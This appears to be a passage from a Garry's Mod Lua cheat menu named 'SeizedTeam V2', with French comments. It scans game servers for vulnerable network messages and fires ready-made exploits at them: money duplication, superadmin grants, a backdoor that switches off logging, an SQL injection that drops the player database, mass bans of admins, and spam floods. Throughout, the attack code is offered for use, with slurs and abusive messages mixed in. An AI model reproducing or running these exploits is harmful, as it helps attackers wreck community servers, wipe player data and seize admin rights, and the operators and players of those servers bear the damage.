surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Stop right/etc" )
    SploitNotify("Stop right/etc")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("-right")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-duck")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-back")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end
-----------------------------
--    OPEN EXPLOIT MENU    --
-----------------------------
-- DANS LE CONTROLLER
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Controller)
        Macro:SetText( "SeizedTeam Exploit" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(130, 0, 0)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeam_exploit", "] ", Color( 255, 255, 255 ), "SeizedTeam Exploit" )
    SploitNotify("SeizedTeam_exploit")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeam" ) -- What happens when you press the button
end

-- DANS LE TARGETS
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Targets)
        Macro:SetText( "SeizedTeam Exploit" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor(15, 15, 15)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "SeizedTeams2.9" )
    SploitNotify("SeizedTeams2.9")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "SeizedTeam" ) -- What happens when you press the button
end

--DANS LE SeizedTeamsV2 NE PAS TOUCHER.

if file.Exists( "includes/extensions/client/vehicles.lua", "LUA" ) == false then -- ne pas toucher cac check !!!!
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
$$\       $$$$$$\   $$$$$$\  $$$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\              
$$ |     $$  __$$\ $$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\            
$$ |     $$ /  $$ |$$ /  $$ |$$ |  $$ |  $$ |  $$$$\ $$ |$$ /  \__|            
$$ |     $$ |  $$ |$$$$$$$$ |$$ |  $$ |  $$ |  $$ $$\$$ |$$ |$$$$\            
$$ |     $$ |  $$ |$$  __$$ |$$ |  $$ |  $$ |  $$ \$$$$ |$$ |\_$$ |            
$$ |     $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |$$ |  $$ |            
$$$$$$$$\ $$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$\ $$ | \$$ |\$$$$$$  |$$\ $$\ $$\
\________|\______/ \__|  \__|\_______/ \______|\__|  \__| \______/ \__|\__|\__|
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Loading !ðŸ’³PlagueDoctorr.#0007 ses un BG
 
 
 
 
 
Loading hentai.lua
 
 
 
 
Loading Mdr.lua
 
 
 
 
 
 
Loading Exploits.lua
 
 
 
 
 
 
 
 
Loadings Tamere.lua
 
 
 
 
Loadings Chuckielebg.lua
 
 
 
 
 
Loading Antifdp.lua
 
 
 
 
 
 
Loading finished...
  ]])
local SeizedTeam = nil
local RatesScaleLevel = LocalPlayer():SteamID()
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local jecodeaveclecullalalalalalalala = Material( "gui/gradient_up" )
local SeizedTeamctperdumaisilestderetouravecunnouveauskinmaistoujourspasdenouveauexploitscarlesexploitssasecreepascommesaetouaicecodeestcheloujesaismaisvoilacommasavousetesperdubandedepigeonquipayezungizehmodifieraieaieaiecessacrementconquandmemedetredespigeonscommesaquoiaieaieaiemaisbonaumoinvousavezunbeaumenu = Material( "gui/gradient_down" )
local ctext = chat.AddText
function iZNX.ChatText( str )
ctext( Color(200, 1, 1), [[ [SeizedTeam V2]: ]]..str )
end
function iZNX.NetStart( str )
local netstart = net.Start
if SeizedTeam and SeizedTeam.G and SeizedTeam.G.net then
netstart = SeizedTeam.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function iZNX.ValidNetString( str )
local netstart = net.Start
if SeizedTeam and SeizedTeam.G and SeizedTeam.G.net then
netstart = SeizedTeam.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function iZNX.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
iZNX.sploits = {}
local severitycols = {
[1] = Color( 255, 255, 255 ),
[2] = Color( 255, 255, 255 ),
[3] = Color( 255, 255, 255 ),
[4] = Color( 255, 255, 255 ),
}
function iZNX.AddExploit( name, tab )
if !isstring( name ) then print("U FUCKED UP A SPLOIT RETARD") return end
if !istable( tab ) then print("U FUCKED UP A SPLOIT RETARD") return end
iZNX.sploits[name] = tab
end
function iZNX.IsStored( addr )
return iZNX.memory[addr] != nil
end
function iZNX.GetStored( addr, fallback )
if fallback and iZNX.memory[addr] == nil then return fallback end
return iZNX.memory[addr]
end
function iZNX.Store( addr, val )
iZNX.memory[addr] = val
end
function iZNX.GetAllStored()
return iZNX.memory
end
function iZNX.GetAllStoredData()
local ret = {}
for k, v in pairs( iZNX.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
function iZNX.LoadConfig()
local f = file.Read( "SeizedTeam_exploit.dat", "DATA" )
if !f then iZNX.ChatText( "T'AS PAS SAVE DE CONFIG SALE TRIZOMIQUE" ) end
local raw = util.Decompress( f )
local garbage = util.JSONToTable( raw )
table.Merge( iZNX.memory, garbage )
--    iZNX.memory = garbage
iZNX.Menu:Remove()
iZNX.ChatText( "Fichier de configuration chargé" )
end
function iZNX.SaveConfig()
local myturds = util.TableToJSON( iZNX.GetAllStoredData() )
if !myturds then return end
local cumpressed = util.Compress( myturds )
file.Write( "SeizedTeam_exploit.dat", cumpressed )
iZNX.ChatText( "Fichier de configuration sauvegardé" )
end
iZNX.AddExploit( "â‚¬ Customizable Printers Money Stealer â‚¬", {
desc = "Vole instantanément tout l'argent de chaque Printer sur le serveur",
severity = 3,
scan = function() return iZNX.ValidNetString( "SyncPrinterButtons76561198056171650" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
if !timer.Exists( "SeizedTeam_exploit_shekels" ) then
iZNX.ChatText( "Vole de l'argent lancé" )
timer.Create( "SeizedTeam_exploit_shekels", 0.1, 0, function()
for k, v in pairs(ents.GetAll()) do
if( v:GetClass():find("print") ) then
iZNX.NetStart( "SyncPrinterButtons76561198056171650" )
net.WriteEntity(v)
net.WriteUInt(2, 4)
net.SendToServer()
end
end
end)
else
timer.Remove( "SeizedTeam_exploit_shekels" )
iZNX.ChatText( "Vole de l'argent stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "ULX Friends Spam", {
desc = "Spams tout le monde sur le serveur avec un message",
severity = 1,
scan = function() return (iZNX.ValidNetString( "sendtable" ) and ulx and ulx.friends ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "Bitch please", addr = "fr_spamstring" },
{ typ = "players", addr = "fr_players" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspams" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspams", 0.5, 0, function()
local t = iZNX.GetStored( "fr_players", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local buyit = {}
for i = 1, 15 do
table.insert( buyit, iZNX.GetStored( "fr_spamstring", "RIP les lags :/ */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*" ) )
end
iZNX.NetStart( "sendtable" )
net.WriteEntity( v )
net.WriteTable( buyit )
net.SendToServer()
end
end)
else
timer.Remove( "bigspams" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Console Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive )",
severity = 1,
scan = function() return iZNX.ValidNetString( "steamid50" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SeizedTeam_exploit_errorz" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "SeizedTeam_exploit_errorz", 0.1, 0, function()
iZNX.NetStart( "steamid50" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end)
else
timer.Remove( "SeizedTeam_exploit_errorz" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Turbo Erreur Spammer", {
desc = "Défonce le serveur rcon avec des erreurs massive.",
severity = 2,
scan = function() return iZNX.ValidNetString( "steamid50" ) end,
functions = {
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "SeizedTeam_exploit_errorzt" ) then
iZNX.ChatText( "erreur spam lancé" )
timer.Create( "SeizedTeam_exploit_errorzt", 0, 0, function()
for i = 1, 100 do
iZNX.NetStart( "steamid50" )
net.WriteString( "Something is creating very strong script errors" )
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_errorzt" )
iZNX.ChatText( "erreur spam stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Kun Drug â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellDrug" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SeizedTeam_exploit_selldrugon" ) then
iZNX.ChatText( "Exploit lancé" )
timer.Create( "SeizedTeam_exploit_selldrugon", 0, 0, function()
for i=1,1000 do
iZNX.NetStart("Kun_SellDrug")
net.WriteString("mushroom")
net.SendToServer()
end
end)
else
timer.Remove( "SeizedTeam_exploit_selldrugon" )
iZNX.ChatText( "Exploit stoppé" )
end
end, },
},
} )
iZNX.AddExploit( "Point Shop Unbox", {
desc = "Exploit a téster",
severity = 2,
scan = function() return iZNX.ValidNetString( "net_PSUnBoxServer" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(player.GetAll()) do
local i = 0
for k2,v2 in pairs(PS.Items) do
if !v:PS_HasItem(v2.ID) then  
timer.Simple(k*i*1.7,function()
iZNX.NetStart("net_PSUnBoxServer")
net.WriteEntity(v)
net.WriteString(v2.ID)
net.SendToServer()
end)
i = i + 1
end
end
end
end, },
},
} )
iZNX.AddExploit( "â˜¢ Give Superadmin â˜¢", {
desc = "Donnez le superadmin aux gens (deco reco pour que cela prenne effet)",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Lancer", func = function()
local t = iZNX.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
iZNX.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
iZNX.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "superadmin donné Ã  "..v:Nick() )
end
end, },
},
} )
local SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = ""
if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Sandbox_ArmDupe"
else
if iZNX.ValidNetString( "Fix_Keypads" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Fix_Keypads"
else
if iZNX.ValidNetString( "Remove_Exploiters" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Remove_Exploiters"
else
if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "noclipcloakaesp_chat_text"
else
if iZNX.ValidNetString( "memeDoor" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "memeDoor"
else
if iZNX.ValidNetString( "ULXQUERY2" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "ULXQUERY2"
else
if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "DarkRP_AdminWeapons"
else
if iZNX.ValidNetString( "_Defqon" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "_Defqon"
else
if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "_CAC_ReadMemory"
else
if iZNX.ValidNetString( "c" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "c"
else
if iZNX.ValidNetString( "killserver" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "killserver"
else
if iZNX.ValidNetString( "fuckserver" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "fuckserver"
else
if iZNX.ValidNetString( "cvaraccess" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "cvaraccess"
else
if iZNX.ValidNetString( "rcon" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "rcon"
else
if iZNX.ValidNetString( "rconadmin" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "rconadmin"
else
if iZNX.ValidNetString( "web" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "web"
else
if iZNX.ValidNetString( "nostrip" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "nostrip"
else
if iZNX.ValidNetString( "LickMeOut" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "LickMeOut"
else
if iZNX.ValidNetString( "MoonMan" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "MoonMan"
if iZNX.ValidNetString( "Im_SOCool" ) then
SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol = "Im_SOCool"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
iZNX.AddExploit( ".NET Backdoor", {
desc = "Backdoor trés puissant, ENLEVE LES LOGS POUR ETRE PLUS DISCRET, Nom De La .NET : "..SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol.."",
severity = 4,
scan = function() return iZNX.ValidNetString( SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol ) end,
functions = {
{ typ = "func", name = "STOP LES LOGS", func = function()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "htxcommandeliste", name = "DESTRUCTION! HTX" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "<- Superadmin", func = function()
local t = iZNX.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
iZNX.NetStart(SeizedTeamilcpasfairedeguiducoupilademanderazilnixetjesuslol)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â˜¢ Niquer la base de donné SQL (sa pique) â˜¢", {
desc = "Vandalisez la base de données darkrp master SQL, effassant toutes les données des joueurs, vous devez être superamin !!",
severity = 4,
scan = function() return iZNX.ValidNetString( "pplay_sendtable" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
local tbl = {}
tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
tbl.ply = LocalPlayer()
iZNX.NetStart("pplay_sendtable")
net.WriteTable(tbl)
net.SendToServer()
iZNX.ChatText( "Base de données SQL Server détruite" )
end, },
},
} )
iZNX.AddExploit( "Niquer les Data du serveur (SA PIQUE)", {
desc = "Vandalise le data du serveur, va probablement ennuyer leurs fils de pute de dev x)",
severity = 3,
scan = function() return iZNX.ValidNetString( "WriteQuery" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
if !timer.Exists( "SeizedTeam_exploit_datatrasher" ) then
iZNX.ChatText( "Démarrage du spam du dossier data" )
timer.Create( "SeizedTeam_exploit_datatrasher", 0.5, 0, function()
iZNX.NetStart( "WriteQuery" )
net.WriteString( "BAN ME -> "..LocalPlayer():SteamID()..string.rep( "!", math.random( 1, 5000 ) ) )
net.SendToServer()
end)
else
timer.Remove( "SeizedTeam_exploit_datatrasher" )
iZNX.ChatText( "Spam du dossier data Stopper" )
end
end, },
},
} )
-- Patched
--[[iZNX.AddExploit( "Turbo Chat Spam", {
desc = "Gros spam, extrÃªmement gamain XD",
severity = 1,
scan = function() return iZNX.ValidNetString( "VJSay" ) end,
functions = {
{ typ = "string", name = "Entrer un message", default = "SeizedTeamMenu", addr = "vj_spamstring" },
{ typ = "string", name = "Entrer un son", default = "vo/npc/male01/hacks01.wav", addr = "vj_spamsound" },
{ typ = "func", name = "Big Spam", func = function()
if !timer.Exists( "bigspamsvj" ) then
iZNX.ChatText( "big spam lancé" )
timer.Create( "bigspamsvj", 0.1, 0, function()
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "VJSay" )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "vj_spamstring", "ACHETER LE @SeizedTeam AJOUTEZ SeizedTeam" ) )
if iZNX.GetStored( "vj_spamsound", "" ) != "" then
net.WriteString( iZNX.GetStored( "vj_spamsound", "" ) )
end
net.SendToServer()
end
end)
else
timer.Remove( "bigspamsvj" )
iZNX.ChatText( "big spam stoppé" )
end
end, },
},
} )--]]
iZNX.AddExploit( "Give une arme", {
desc = "Exploit pour vous give des putains d'armes",
severity = 3,
scan = function() return iZNX.ValidNetString( "CraftSomething" ) end,
functions = {
{ typ = "string", name = "Nom Arme", default = "m9k_ak47", addr = "armes_a_prendre" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "CraftSomething" )
net.WriteEntity( LocalPlayer() )
net.WriteString( iZNX.GetStored( "armes_a_prendre" ) )
net.WriteString( "" )
net.WriteString( "weapon" )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "ULX Extended ", {
desc = "Attention cette exploit est risquée si l'addon est Ã  jour vous allez Ãªtre kick ^^",
severity = 3,
scan = function() return iZNX.ValidNetString( "banleaver" ) end,
functions = {
{ typ = "func", name = "Ban les Admins (bug)", func = function()
for k,v in pairs(player.GetAll()) do              
if v:GetUserGroup() != "user" then -- Custom first ranks, youre fucked bro                
if v != LocalPlayer() then                
iZNX.NetStart("banleaver")                
net.WriteString(v:SteamID().."{sep}".."SeizedTeamRekt")                
net.SendToServer()                
end                
end                
end
end, },
{ typ = "func", name = "Ban tout le monde (bug)", func = function()
for k,v in pairs(player.GetAll()) do              
if v != LocalPlayer() then                
iZNX.NetStart("banleaver")                
net.WriteString(v:SteamID().."{sep}".."SeizedTeamRekt")                
net.SendToServer()                
end                
end  
end, },
},
} )
iZNX.AddExploit( "â‚¬ Casino NPC â‚¬", {
desc = "Exploit d'argent trÃ¨s efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "75_plus_win" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent" },
{ typ = "players", addr = "l_players_listing" },
{ typ = "func", name = "Donner", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
{ typ = "func", name = "Enlever", func = function()
local t = iZNX.GetStored( "l_players_listing", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "75_plus_win" )
net.WriteString( -iZNX.GetStored( "montant_argent" ) )
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ ATM â‚¬", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "ATMDepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent5" },
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "ATMDepositMoney" )
net.WriteFloat( -iZNX.GetStored( "montant_argent5" ) )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "TAXI Spawn Lag", {
desc = "Exploit pour faire chier les fdp de codeurs ;)",
severity = 2,
scan = function() return iZNX.ValidNetString( "Taxi_Add" ) end,
functions = {
{ typ = "func", name = "Spawn", func = function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end, },
{ typ = "func", name = "Super Spam", func = function()
if !timer.Exists( "taxispam" ) then
iZNX.ChatText( "Spam spawn Taxi lancé" )
timer.Create( "taxispam", 0.05, 0, function()
local Pos = LocalPlayer():GetEyeTrace().HitPos
iZNX.NetStart("Taxi_Add")
net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
net.WriteFloat(-9999999)
net.WriteString("Les addons leaks c'est plein d'exploit :D")
net.SendToServer()
end)
else
timer.Remove( "taxispam" )
iZNX.ChatText( "Spam spawn Taxi arreter" )
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ eMining â‚¬", {
desc = "Exploit d'argent trÃ¨s efficace, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "SellMinerals" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent6" },
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("jecodeaveclecullalalalalalalalae")
net.WriteTable( { LuaName = v.LuaName, Amount = -iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
{ typ = "func", name = "Enlever", func = function()
for k,v in pairs(SkillDB) do
if not ( v.iSkill == true ) then
iZNX.NetStart("jecodeaveclecullalalalalalalalae")
net.WriteTable( { LuaName = v.LuaName, Amount = iZNX.GetStored( "montant_argent6" ) } )
net.SendToServer()
iZNX.NetStart( "SellMinerals" )
net.WriteTable( { Target = LocalPlayer() } )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "â‚¬ Gamble NPC â‚¬", {
desc = "Exploit d'argent Infini, go payer des putes et de la coke ;)",
severity = 4,
scan = function() return iZNX.ValidNetString( "TakeBetMoney" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
iZNX.NetStart( "TakeBetMoney" )
net.WriteTable({1e333333 , 1e333333})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Kun Oil Mod â‚¬", {
desc = "Exploit d'argent, go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "Kun_SellOil" ) end,
functions = {
{ typ = "func", name = "Prendre", func = function()
for k,v in pairs(ents.GetAll()) do
iZNX.NetStart("Kun_SellOil")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 1", {
desc = "Rejoint la police sans passer par le putain de formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "PoliceJoin" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("PoliceJoin")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Rejoindre la Police 2", {
desc = "Rejoint la police sans passer le putain formulaire",
severity = 2,
scan = function() return iZNX.ValidNetString( "CpForm_Answers" ) end,
functions = {
{ typ = "func", name = "Rejoindre", func = function()
iZNX.NetStart("CpForm_Answers")
net.WriteEntity(LocalPlayer())
net.WriteTable({})
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Deposit Money â‚¬", {
desc = "Exploit d'argent avec les ATM Deposit Money",
severity = 2,
scan = function() return iZNX.ValidNetString( "DepositMoney" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent7" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do
swag = v
end
for k,v in pairs(player.GetAll()) do
iZNX.NetStart( "DepositMoney" )
net.WriteEntity(swag)
net.WriteString(-iZNX.GetStored( "montant_argent7" ))
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "MDE", {
desc = "Exploit pour supprimer des PermaProps (Viser le props et cliquer sur l'exploit pour le supprimer)",
severity = 2,
scan = function() return iZNX.ValidNetString( "MDE_RemoveStuff_C2S" ) end,
functions = {
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart( "MDE_RemoveStuff_C2S" )
net.WriteTable( {DATA="",TARGET=LocalPlayer():GetEyeTrace().Entity} )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ SS Shelf NET â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_SS_DoBuyTakeoff" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent9" },
{ typ = "func", name = "Lancer", func = function()
for k,v in pairs(ents.GetAll()) do
swag = v
end
iZNX.NetStart( 'NET_SS_DoBuyTakeoff' )          
net.WriteEntity(LocalPlayer())          
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-iZNX.GetStored( "montant_argent9" ), 16)      
net.SendToServer()  
end, },
},
} )
iZNX.AddExploit( "â‚¬ MODIFIER TAXES â‚¬", {
desc = "Exploit d'argent",
severity = 3,
scan = function() return iZNX.ValidNetString( "NET_EcSetTax" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent10" },
{ typ = "func", name = "Lancer", func = function()
iZNX.NetStart("NET_EcSetTax")
net.WriteInt(-iZNX.GetStored( "montant_argent10" ), 16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "â‚¬ Fine System â‚¬", {
desc = "Exploit d'argent , go payer des putes et de la coke ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "RP_Accept_Fine" ) end,
functions = {
{ typ = "float", name = "Montant", min = "1", max = "100000000", default = "100000", addr = "montant_argent11" },
{ typ = "players", addr = "l_players_listing_fine" },
{ typ = "func", name = "Prendre", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Accept_Fine")
net.WriteString(v:Nick())
net.WriteDouble(-iZNX.GetStored( "montant_argent11" ))
net.SendToServer()
end
end, },
{ typ = "func", name = "Envoyer Amende x)", func = function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(iZNX.GetStored( "montant_argent11" ))
net.WriteString("Ce serveur mérite une anarchie! Serveur hacked!! Vous pouvez lecher mon trou du cul maintenant x)")
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam Envoyer Amende x)", func = function()
if !timer.Exists( "spamamandefine" ) then
iZNX.ChatText( "Spam lancé" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = iZNX.GetStored( "l_players_listing_fine", {} )
